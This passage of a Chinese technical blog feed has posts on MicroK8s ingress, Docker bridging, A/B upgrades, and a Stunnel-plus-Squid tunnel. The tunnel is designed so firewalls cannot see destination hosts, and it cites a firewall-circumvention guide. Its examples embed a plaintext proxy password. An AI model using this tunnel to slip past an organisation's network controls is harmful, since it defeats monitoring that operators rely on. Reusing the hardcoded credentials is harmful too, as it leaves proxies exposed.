<h2><span id="支持tcp负载均衡">支持TCP负载均衡</span></h2><p>Ingress同时支持四层(TCP,UDP)的负载均衡, 例如:</p>
<p>创建一个TCP服务, 监听8888端口 (tcp-service.yaml)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: tcp-server</span><br><span class="line">  namespace: service-foo</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: tcp-server</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: tcp-server</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: tcp-container</span><br><span class="line">        image: busybox</span><br><span class="line">        command: [&quot;nc&quot;, &quot;-lk&quot;, &quot;8888&quot;]</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8888</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: tcp-service</span><br><span class="line">  namespace: service-foo</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    app: tcp-server</span><br><span class="line">  ports:</span><br><span class="line">    - protocol: TCP</span><br><span class="line">      port: 8888</span><br><span class="line">      targetPort: 8888</span><br><span class="line">  type: ClusterIP</span><br></pre></td></tr></table></figure>

<p>配置Ingress的ConfigMap, 以支持TCP的暴露</p>
<p>创建nginx-ingress-tcp-microk8s-conf-patch.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kind: ConfigMap</span><br><span class="line">apiVersion: v1</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-ingress-tcp-microk8s-conf</span><br><span class="line">  namespace: ingress</span><br><span class="line">data:</span><br><span class="line">  &quot;8888&quot;: tcp-service:8888</span><br></pre></td></tr></table></figure>
<p>修改Ingress的ConfigMap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n ingress patch cm nginx-ingress-tcp-microk8s-conf --patch-file nginx-ingress-tcp-microk8s-conf-patch.yaml</span><br></pre></td></tr></table></figure>

<p>从集群外部测试, 访问成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># telnet foo.example.com 8888</span><br><span class="line">Connected to foo.example.com.</span><br><span class="line">Escape character is &#x27;^]&#x27;</span><br></pre></td></tr></table></figure>

<h2><span id="ingress-支持https">Ingress 支持HTTPS</span></h2><p>生成证书和私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj &quot;/CN=example.com/O=Example Company&quot;</span><br></pre></td></tr></table></figure>
<p>创建kubernetes secret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microk8s kubectl create secret tls example-tls --cert=tls.crt --key=tls.key -n default</span><br></pre></td></tr></table></figure>
<p>改一下Ingress的DaemonSet, 添加一行<code>--default-ssl-certificate</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: DaemonSet</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-ingress-microk8s-controller</span><br><span class="line">  namespace: ingress</span><br><span class="line">spec:</span><br><span class="line">  template:</span><br><span class="line">    spec:</span><br><span class="line">      hostNetwork: true</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx-ingress-microk8s</span><br><span class="line">        args:</span><br><span class="line">        # must list all others here?</span><br><span class="line">        - /nginx-ingress-controller</span><br><span class="line">        - --configmap=$(POD_NAMESPACE)/nginx-load-balancer-microk8s-conf</span><br><span class="line">        - --tcp-services-configmap=$(POD_NAMESPACE)/nginx-ingress-tcp-microk8s-conf</span><br><span class="line">        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-ingress-udp-microk8s-conf</span><br><span class="line">        - --ingress-class=public</span><br><span class="line">        - &#x27; &#x27;</span><br><span class="line">        - --publish-status-address=127.0.0.1</span><br><span class="line">        - --default-ssl-certificate=default/example-tls</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n ingress patch ds nginx-ingress-microk8s-controller --patch-file nginx-ingress-microk8s-controller-patch.yaml</span><br></pre></td></tr></table></figure>

<p>从集群外部测试, HTTP和HTTPS都可以访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl foo.example.com/foo/</span><br><span class="line">Hello Foo!</span><br><span class="line"># curl https://bar.example.com/bar/ -k</span><br><span class="line">Hello Bar!</span><br></pre></td></tr></table></figure>

<h2><span id="问题">问题</span></h2><p>Q: 可能遇到导入Microk8s镜像失败, <code>microk8s.ctr image list</code>查询镜像类型为text&#x2F;html, 只有几百k<br>A: 原因一般是之前导入镜像前就创建了pod, Microk8s尝试从网络获取镜像失败; 解决方法是先<code>microk8s.ctr image rm</code>删除旧的镜像, 再重新导入即可</p>
<h2><span id="参考">参考</span></h2><p>【1】 <a href="https://microk8s.io/docs/addon-ingress">https://microk8s.io/docs/addon-ingress</a><br>【2】 <a href="https://kubernetes.io/docs/concepts/services-networking/ingress/">https://kubernetes.io/docs/concepts/services-networking/ingress/</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Stunnel加密通信方案设计, 突破防火墙限制</title>
    <url>/2025/0303215009.html</url>
    <content><![CDATA[<h1><span id="前言">前言</span></h1><p>我们在企业客户网络中部署了一些On-Premises的服务网关, 服务网关上部署了Squid代理软件, 为客户本地终端访问云服务提供正向代理<br>然而，对于使用较旧防火墙的客户来说，这些防火墙不支持基于FQDN(完全合格域名)的通配符匹配。这意味着当本地终端尝试访问云端资源时，用户必须逐一配置FQDN, 这种配置过程不仅繁琐，而且容易因为遗漏某些FQDN导致连接被防火墙阻止，造成网络中断，严重影响用户体验。<br>针对这个问题, 我们设计了一种基于Stunnel的加密通信方案, 绕过客户防火墙限制。 客户仅需配置Stunnel服务器的FQDN, 无需为每个目标服务器的FQDN进行单独设置, 从而简化了防火墙配置流程，提升了用户体验。</p>
<h1><span id="stunnel是什么-被设计用来解决什么问题">Stunnel是什么, 被设计用来解决什么问题</span></h1><p>Stunnel是一款开源软件，其主要功能是为应用程序或服务提供TLS&#x2F;SSL加密支持。 它的设计初衷是为了增强那些本身不支持加密功能的传统应用程序或服务的安全性<br>通过Stunnel, 可以在严格的防火墙规则下实现安全的加密通信，同时有效绕过可能存在的网络访问限制。</p>
<h1><span id="为什么需要stunnel">为什么需要Stunnel ?</span></h1><h2><span id="直接通过墙内的squid代理出去不行吗">直接通过墙内的Squid代理出去不行吗？</span></h2><p><img data-src="/2025/0303215009/direct.png"></p>
<span id="more"></span>

<p>演示一下, 创建两台Linux虚拟机</p>
<ul>
<li>客户端 (192.168.52.200)</li>
<li>Squid代理 (192.168.52.204)</li>
</ul>
<p>客户端通过Squid代理直接访问目标服务器<code>www.trendmicro.com</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x 192.168.52.204:3128 https://www.trendmicro.com</span><br></pre></td></tr></table></figure>

<p>wireshark抓包结果如下:</p>
<p>客户端和Squid代理之间报文<br><img data-src="/2025/0303215009/image_direct0.png"></p>
<p>Squid代理到目标服务器之间的报文<br><img data-src="/2025/0303215009/image_direct1.png"></p>
<p>从报文中可以看出, 防火墙可以直接识别目标服务器的IP, 这会导致连接被阻止.</p>
<h2><span id="http-tunnelhttp隧道的概念">HTTP tunnel(HTTP隧道)的概念</span></h2><p>HTTP tunnel是HTTP&#x2F;1.1引入的功能, 常用于两台网络受限的机器之间建立网络连接。 客户端通过发送HTTP CONNECT请求与代理建立TCP隧道, 以访问HTTPS服务<br>根据上面抓包结果, 可以梳理出HTTP tunnel的工作过程:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端                                 Squid(代理)                           目标服务器</span><br><span class="line">  |                                       |                                      |</span><br><span class="line">  | --- TCP connection                 --&gt;|                                      |</span><br><span class="line">  |                                       |                                      |</span><br><span class="line">  | --- CONNECT www.trendmicro.com:443 --&gt;|                                      |</span><br><span class="line">  |                                       |                                      |</span><br><span class="line">  |                                       | --- TCP connection                --&gt;|</span><br><span class="line">  |                                       |                                      |</span><br><span class="line">  | &lt;-- HTTP 200 OK                    ---|                                      |</span><br><span class="line">  |     Connection Established            |                                      | </span><br><span class="line">  |                                       |                                      |   </span><br><span class="line">   ========================== CONNECT tunnel Established ======================= |	</span><br><span class="line">  |                                       |                                      |</span><br><span class="line">  | --- TLS Application Data           --&gt;|                                      |</span><br><span class="line">  |                                       |                                      |</span><br><span class="line">  |                                       | --- TLS Application Data          --&gt;|</span><br><span class="line">  |                                       |                                      |</span><br><span class="line">  |                                       | &lt;-- TLS Stream                    ---|</span><br><span class="line">  |                                       |     HTTP 200 OK                      |</span><br><span class="line">  |                                       |                                      |</span><br><span class="line">  | &lt;-- TLS Stream                     ---|                                      |</span><br><span class="line">  |     HTTP 200 OK                       |                                      |</span><br></pre></td></tr></table></figure>
<ul>
<li>客户端和代理服务器建立TCP连接</li>
<li>然后, 客户端向代理发送明文的HTTP CONNECT请求, 告知代理需要连接的目标服务器</li>
<li>代理收到请求后, 和目标服务器建立TCP隧道连接, 并返回200 Connection Established给客户端, 告诉客户端隧道已经成功建立</li>
<li>隧道建立后, 代理仅负责转发数据而不解析或修改内容，确保了HTTPS数据的安全性，即使对于代理而言也无法解密TLS加密的内容</li>
</ul>
<h2><span id="在墙外部署squid代理行不行呢">在墙外部署Squid代理行不行呢 ?</span></h2><p><img data-src="/2025/0303215009/squid-outof-firewall.png"></p>
<p>这种方案仍然会存在问题, 这里演示一下, 准备两台虚拟机, 一台云服务器</p>
<ul>
<li>客户端 (192.168.52.200)</li>
<li>墙内代理 (192.168.52.204)</li>
<li>墙外代理(云服务器) (47.103.80.253)</li>
</ul>
<p>wireshark抓包：</p>
<p>客户端和墙内Squid代理之间的报文<br><img data-src="/2025/0303215009/image_no_stunnel0.png"></p>
<p>墙内Squid到墙外Squid之间的报文<br><img data-src="/2025/0303215009/image_no_stunnel1.png"></p>
<p>观察抓包结果可以发现:</p>
<ul>
<li>尽管正文部分是经过TLS加密的，但HTTP CONNECT请求是明文传输的，这意味着防火墙可以识别其中的目标服务器信息及代理认证信息（如用户名和密码), 此外，TLS握手过程中Client Hello报文中的SNI也会暴露目标服务器信息，因此这种方式仍然会被防火墙识别并阻止。</li>
<li>另外，代理认证信息在公网上传输也是非常不安全的做法</li>
</ul>
<p><img data-src="/2025/0303215009/image_no_stunnel2.png"></p>
<h1><span id="基于stunnel加密通信方案">基于Stunnel加密通信方案</span></h1><p><img data-src="/2025/0303215009/my_design.png"></p>
<p>说明：</p>
<ul>
<li>墙内部署Squid + Stunnel client, 墙外部署Stunnel Server + Squid, 客户终端的代理设置为墙内的Squid</li>
<li>通过这种方案, 客户防火墙不需要逐一指定目标服务器的FQDN, 只需允许通往Stunnel服务器（端口443）的流量即可。</li>
</ul>
<p>接下来，通过实际搭建环境演示一下</p>
<ul>
<li>墙内的主机(192.168.52.204), 部署 Squid Client + Stunnel Client</li>
<li>墙外的云服务器(47.103.80.253), 部署 Stunnel Server + Squid Server</li>
</ul>
<h2><span id="配置墙外的云服务器部署-stunnel-server-squid-server">配置墙外的云服务器(部署 Stunnel Server + Squid Server)</span></h2><ol>
<li><p>安装软件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y squid stunnel</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置Squid</p>
</li>
</ol>
<ul>
<li><p>Squid启用basic认证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y httpd-tools</span><br><span class="line">htpasswd -c /etc/squid/squid_user test</span><br><span class="line">New password: qY8kd0Cf</span><br><span class="line">Re-type new password: qY8kd0Cf</span><br><span class="line">Adding password for user test</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置密码，并验证密码文件是否正确生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/squid/squid_user</span><br><span class="line">test:$XXXXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line">/usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_user </span><br><span class="line">test qY8kd0Cf</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改Squid配置文件（&#x2F;etc&#x2F;squid&#x2F;squid.conf），添加以下认证相关配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Insert your own rules here to allow access from your clients</span><br><span class="line"></span><br><span class="line"># http_access allow localhost  加注释，表示localhost也需要认证</span><br><span class="line"></span><br><span class="line">auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_user</span><br><span class="line">auth_param basic children 5</span><br><span class="line">auth_param basic realm Proxy Authentication Required</span><br><span class="line">auth_param basic credentialsttl 2 hours</span><br><span class="line">auth_param basic casesensitive on</span><br><span class="line"></span><br><span class="line">acl authUsers proxy_auth REQUIRED</span><br><span class="line">http_access allow authUsers</span><br><span class="line"></span><br><span class="line">http_access deny all</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启Squid服务并测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart squid</span><br><span class="line"></span><br><span class="line">curl -x localhost:3128 https://www.baidu.com</span><br><span class="line">curl: (56) Received HTTP code 407 from proxy after CONNECT</span><br><span class="line"># curl -x test:qY8kd0Cf@localhost:3128 https://www.baidu.com</span><br><span class="line">200 OK</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>配置Stunnel</li>
</ol>
<ul>
<li><p>生成一个自签名证书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl req -new -x509 -days 365 -nodes -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑Stunnel配置文件<code>/etc/stunnel/stunnel.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cert = /etc/stunnel/stunnel.pem</span><br><span class="line">client = no</span><br><span class="line"></span><br><span class="line">[squid]</span><br><span class="line">accept = 443</span><br><span class="line">connect = 127.0.0.1:3128</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动Stunnel</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart stunnel</span><br></pre></td></tr></table></figure></li>
</ul>
<h2><span id="配置墙内的机器部署-squid-stunnel-client">配置墙内的机器(部署 Squid + Stunnel Client)</span></h2><ol>
<li>配置Stunnel</li>
</ol>
<ul>
<li><p>编辑Stunnel配置文件 <code>/etc/stunnel/stunnel.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">debug=5</span><br><span class="line">client = yes</span><br><span class="line">verify=0</span><br><span class="line">output=/var/log/stunnel.log</span><br><span class="line">pid = /var/run/stunnel.pid</span><br><span class="line">[upstream]</span><br><span class="line">accept = 8081</span><br><span class="line"></span><br><span class="line">connect=47.103.80.253:443</span><br><span class="line">sslVersion=TLSv1.2</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动Stunnel, 使用curl测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart stunnel</span><br><span class="line"></span><br><span class="line">curl -x &#x27;test:qY8kd0Cf@localhost:8081&#x27; https://www.trendmicro.com -i</span><br><span class="line">200 OK</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>配置Squid</li>
</ol>
<ul>
<li><p>修改Squid.conf, 所有流量都转发到本地Stunnel, 并指定云端Proxy的用户名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http_access allow localhost</span><br><span class="line"></span><br><span class="line">never_direct allow all</span><br><span class="line">cache_peer 127.0.0.1 parent 8081 0 no-query default login=test:qY8kd0Cf</span><br><span class="line"></span><br><span class="line">http_access deny all</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动Squid, 并使用curl测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start squid</span><br><span class="line"></span><br><span class="line">curl -x localhost:3128 https://www.trendmicro.com -i</span><br></pre></td></tr></table></figure></li>
</ul>
<h2><span id="测试墙内到墙外的数据是否加密">测试墙内到墙外的数据是否加密</span></h2><p>为了验证数据是否被加密，在客户端通过墙内代理访问墙外云服务器，并使用Wireshark抓包分析; 在客户端执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x &#x27;test:qY8kd0Cf@192.168.52.204:8081&#x27; https://www.trendmicro.com -i</span><br></pre></td></tr></table></figure>

<p>客户端到代理的报文:<br><img data-src="/2025/0303215009/image_ok0.png"></p>
<p>墙内代理到墙外云服务器的报文:<br><img data-src="/2025/0303215009/image_ok1.png"></p>
<p>可以看到这一段的请求数据已经被加密, 防火墙只能看到Stunnel服务器的FQDN, 无法识别真正的目标服务器</p>
<h2><span id="为啥不直接用https代理">为啥不直接用HTTPS代理 ?</span></h2><p>客户虚拟设备是临时部署的, HTTPS代理需要管理和维护SSL&#x2F;TLS证书, 增加了部署的复杂性<br>在客户内网中使用HTTP代理可以保证安全，所有客户都走HTTPS代理有性能损失, Stunnel加密方案只针对防火墙配置有问题的部分客户开放</p>
<h2><span id="方案的缺点是什么">方案的缺点是什么</span></h2><p>Stunnel在处理大量TLS加密流量时会遇到性能瓶颈, 参考<a href="https://www.stunnel.org/perf.html">stunnel performance data</a><br><img data-src="/2025/0303215009/stunnel_benchmark.png"></p>
<p>我们的解决方法是水平扩展, 让客户多部署几台Stunnel, 以处理更多的终端<br><img data-src="/2025/0303215009/final.png"></p>
<h2><span id="参考">参考</span></h2><p><a href="https://www.hawu.me/operation/886">squid + stunnel &gt;&gt; 跨越长城，科学上网！</a></p>
]]></content>
      <categories>
        <category>Stunnel</category>
      </categories>
      <tags>
        <tag>Project</tag>
        <tag>Stunnel</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker创建自定义网桥并指定网段</title>
    <url>/2025/0304214819.html</url>
    <content><![CDATA[<h1><span id="前言">前言</span></h1><p>docker0是Docker默认网络的核心组件, 通过虚拟网桥和NAT技术, 实现了容器间的通信以及容器与外部网络的交互。然而, docker0网段是固定的(通常是172.17.0.0&#x2F;16), 为了更灵活地管理容器网络，Docker支持创建自定义网桥，允许用户指定网段。<br>例如, 在我以前做的一个单板仿真项目里, 每个容器用来模拟一块板, 单板的IP需要设置为172.16.0.0&#x2F;16, 和docker0网段不一致。 由于这个项目部署在每个开发的工作机上, 我们决定不直接修改docker0配置, 选择了创建自定义网桥这种更灵活的方式。</p>
<h1><span id="docker网桥的工作机制">Docker网桥的工作机制</span></h1><p>Docker在主机上创建一个虚拟网桥(docker0), 每当启动一个容器，Docker会自动创建一对虚拟网卡(veth pair), 其中一端放在容器内部作为它的网络接口, 另一端则连接到主机上的这个虚拟网桥。 通过这种方式，容器之间可以通过网桥直接通信，数据包在网桥内转发，不经过主机的物理网络接口。<br>如果容器访问的是外部网络, 容器发出的数据包会先通过虚拟网桥到达主机, 然后主机通过NAT将容器的私有IP替换为自己的公网IP，从而让数据包能够顺利发送到外部网络。</p>
<span id="more"></span>
<p><img data-src="/2025/0304214819/image2.png"></p>
<h1><span id="示例-创建自定义网桥">示例： 创建自定义网桥</span></h1><p>创建自定义网桥br0, 网段为172.16.0.0&#x2F;16, 创建一组容器连到网桥br0, 各容器通过eth1(172.16.0.0&#x2F;16)可以互联</p>
<h2><span id="创建自定义网桥br0">创建自定义网桥br0</span></h2><p>创建一个新的网桥br0, 为其分配子网172.16.0.254&#x2F;24</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ip link add name br0 type bridge</span><br><span class="line">sudo ip link set dev br0 up</span><br><span class="line">sudo ip addr add 172.16.0.254/16 dev br0</span><br></pre></td></tr></table></figure>

<h2><span id="启动两个容器并连接到docker0">启动两个容器并连接到docker0</span></h2><p>启动2个容器, 默认连接到docker0网桥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -d --name container1 rockylinux:9.3 bash</span><br><span class="line">docker run -it -d --name container2 rockylinux:9.3 bash</span><br></pre></td></tr></table></figure>

<h2><span id="将容器的-eth1-连接到自定义网桥-br0">将容器的 eth1 连接到自定义网桥 br0</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 添加veth pair</span><br><span class="line">ip link add veth1_a type veth peer name veth1_b</span><br><span class="line">ip link set veth1_a master br0</span><br><span class="line">ip link set veth1_a up</span><br><span class="line"></span><br><span class="line"># 把veth1_b移到容器的namespace</span><br><span class="line">pid_container1=$(docker inspect -f &#x27;&#123;&#123;.State.Pid&#125;&#125;&#x27; container1)</span><br><span class="line">ip link set veth1_b netns $pid_container1</span><br><span class="line"></span><br><span class="line"># veth1_b重命名为eth1</span><br><span class="line">nsenter -t $pid_container1 -n ip link set veth1_b name eth1</span><br><span class="line">nsenter -t $pid_container1 -n ip link set eth1 up</span><br><span class="line"></span><br><span class="line"># 为eth1分配地址</span><br><span class="line">nsenter -t $pid_container1 -n ip addr add 172.16.1.1/16 dev eth1</span><br></pre></td></tr></table></figure>
<p>另一个容器做类似操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 添加veth pair</span><br><span class="line">ip link add veth2_a type veth peer name veth2_b</span><br><span class="line">ip link set veth2_a master br0</span><br><span class="line">ip link set veth2_a up</span><br><span class="line"></span><br><span class="line">pid_container2=$(docker inspect -f &#x27;&#123;&#123;.State.Pid&#125;&#125;&#x27; container2)</span><br><span class="line">ip link set veth2_b netns $pid_container2</span><br><span class="line"></span><br><span class="line">nsenter -t $pid_container2 -n ip link set veth2_b name eth1</span><br><span class="line">nsenter -t $pid_container2 -n ip link set eth1 up</span><br><span class="line"></span><br><span class="line">nsenter -t $pid_container2 -n ip addr add 172.16.1.2/16 dev eth1</span><br></pre></td></tr></table></figure>

<p>效果:</p>
<p>容器A</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.3  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:03  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 127  bytes 188687 (184.2 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 121  bytes 9040 (8.8 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.1.1  netmask 255.255.0.0  broadcast 0.0.0.0</span><br><span class="line">        inet6 fe80::4a5:69ff:feb8:acc0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 06:a5:69:b8:ac:c0  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 125  bytes 10982 (10.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 106  bytes 9476 (9.2 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 32  bytes 2688 (2.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 32  bytes 2688 (2.6 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"># route</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">default         _gateway        0.0.0.0         UG    0      0        0 eth0</span><br><span class="line">172.16.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth1</span><br><span class="line">172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0</span><br><span class="line"></span><br><span class="line"># ping 172.16.1.2</span><br><span class="line">PING 172.16.1.2 (172.16.1.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.16.1.2: icmp_seq=1 ttl=64 time=0.471 ms</span><br></pre></td></tr></table></figure>

<p>容器B</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 27  bytes 2006 (1.9 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 9  bytes 626 (626.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.1.2  netmask 255.255.0.0  broadcast 0.0.0.0</span><br><span class="line">        inet6 fe80::10b0:1aff:fe2f:766d  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 12:b0:1a:2f:76:6d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 119  bytes 10386 (10.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 105  bytes 9406 (9.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">		</span><br><span class="line"># ping 172.16.1.1</span><br><span class="line">PING 172.16.1.1 (172.16.1.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.16.1.1: icmp_seq=1 ttl=64 time=0.091 ms</span><br></pre></td></tr></table></figure>

<h1><span id="参考">参考</span></h1><p><a href="https://www.cnblogs.com/goloving/p/15133673.html">浅析docker容器网桥的实现原理以及docker的四种网络模式和bridge模式的具体原理</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux双系统分区升级方案设计</title>
    <url>/2025/0313201413.html</url>
    <content><![CDATA[<h1><span id="背景">背景</span></h1><p>早期，客户的On-premises网关设备（基于CentOS 7）采用增量升级方案进行固件更新。 这种方案存在两个主要问题：</p>
<ul>
<li>一旦升级过程中出现问题，客户只能重新安装系统，严重影响用户体验。</li>
<li>部分客户未开启自动升级功能，为了支持所有客户的升级需求，升级包必须保存从初始版本到最新版本的所有增量文件。随着版本迭代，升级包变得越来越大，难以维护。</li>
</ul>
<p>为了解决这些问题，需要为客户网关设备设计一种新的升级方案。</p>
<h1><span id="ax2fb系统升级简介">A&#x2F;B系统升级简介</span></h1><p>A&#x2F;B分区升级机制允许设备在不同分区上安装和运行系统的不同版本，从而实现无缝更新。这种方法常用于移动设备、物联网设备以及其他需要高可用性和减少停机时间的场景中。例如，Android系统、Chrome OS及许多嵌入式和IoT设备都采用了A&#x2F;B系统升级方法。其主要优点包括：</p>
<ul>
<li>无缝更新：可以在系统运行期间进行更新，唯一的宕机发生在设备重启到更新后分区时。</li>
<li>故障恢复：如果升级失败，设备仍可工作在旧分区，并允许客户继续尝试升级。</li>
</ul>
<span id="more"></span>

<h1><span id="方案">方案</span></h1><p><img data-src="/2025/0313201413/image1.png"></p>
<p>升级方案中包含以下关键环节:</p>
<ul>
<li>设计分区</li>
<li>构建升级包</li>
<li>同步系统配置</li>
<li>配置GRUB启动项</li>
</ul>
<h2><span id="设计分区">设计分区</span></h2><p>客户的设备只有一个虚拟硬盘，因此需要重新设计分区方案，划出两个系统分区，具体如下：</p>
